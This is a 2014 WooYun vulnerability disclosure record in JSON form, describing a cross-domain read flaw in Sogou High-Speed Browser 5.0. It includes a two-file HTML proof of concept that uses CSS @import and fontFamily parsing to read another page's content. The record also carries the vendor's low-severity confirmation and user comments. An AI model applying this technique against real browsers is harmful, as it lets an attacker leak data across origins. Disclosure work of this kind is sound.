{"id": 1027, "wybug_id": "wooyun-2014-066627", "wybug_title": "搜狗高速浏览器最新版5.0及以下版本存在跨域漏洞", "wybug_corp": "搜狗", "wybug_author": "从容", "wybug_date": "2014-07-03 12:56", "wybug_open_date": "2014-10-01 12:58", "wybug_type": "权限提升", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器漏洞", "浏览器漏洞利用技巧", "浏览器漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向公众公开  简要描述： 搜狗高速浏览器最新版5.0及以下版本存在跨域漏洞 详细说明：  下载搜狗高速浏览器5.0\nhttp://ie.sogou.com/\n搜狗高速浏览器一直都是都是基于IE内核的浏览器问题发生在CSS Parse的过程中，将fontFamily后面的内容当做了value，从而就可以实现跨域- -.   漏洞证明：  构造两个测试跨域的POC：test1.html\n<html>\t<head>\t\t<title>test1</title>\t\t</head>\t\t<body>\t\t\t{}body{font-family:\t\t\tWooYun\t\t\t</body>\t</html>\ntest2.html\n<html>\t<head>\t\t<title>test2</title>\t\t</head>\t\t<body>\t\t\t<style>\t\t\t\t@import url(\"C:\\Users\\Administrator\\Desktop\\test1.html\");\t\t\t\t</style>\t\t\t\t<script>\t\t\t\t\tsetTimeout(function(){\t\t\t\t\t\tvar t = document.body.currentStyle.fontFamily;\t\t\t\t\t\talert(t);\t\t\t\t\t},2000);\t\t\t\t\t</script>\t\t\t</body></html>\n用搜狗高速浏览器5.0访问test2.html但是一定要更换为IE兼容模式\n\n因为这是IE内核浏览器存在的漏洞...\n\n成功实现跨域读取test1.html中的内容...5.0以下的版本我就不发图了，因为确实存在，这是搜狗高速浏览器模式的特性，各个版本都有IE兼容模式的...在test2.html 中通过@import加载了 test.html 为CSS文件，渲染进入当前DOM，同时通过 document.body.currentStyle.fontFamily 访问此内容，问题发生在CSS Parse的过程中，将fontFamily后面的内容当做了value，从而读出了test1.html的页面内容.   修复方案：  补丁:)   版权声明：转载请注明来源 从容@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-07-07 16:09 厂商回复： 感谢支持，欢迎到SGSRC报告漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-03 13:10 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  mark关注一下    \n     2014-07-03 13:31 |    \t\t90sid \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | (*^__^*))\t\t \n  mark    \n     2014-07-03 18:56 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @梧桐雨 大牛.....    \n     2014-07-05 01:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  怀疑误报 本地跨域是允许的 @疯狗    \n     2014-07-07 16:17 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  mark    \n     2014-07-07 16:30 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @xsser 方总…搜狗确认了…    \n     2014-07-07 18:28 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 搜狗平台太太太太坑爹了    \n     2014-07-07 19:38 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @小胖胖要减肥 还行吧，还是挺在乎白帽子的    \n     2014-07-07 20:39 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @从容 分数坑爹，态度蛮好的    \n     2014-07-07 20:54 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @小胖胖要减肥 重在参与    \n     2014-07-08 00:52 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @从容 还是wooyun好 一样发现问题，wb更实惠    \n     2014-07-08 10:48 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @小胖胖要减肥 是啊，还能认识这么多大手子~    \n     2014-10-01 17:40 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  居然认了。。。360直接忽略啊。其实我也感觉不算厂商的= =    \n     2014-10-01 19:10 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}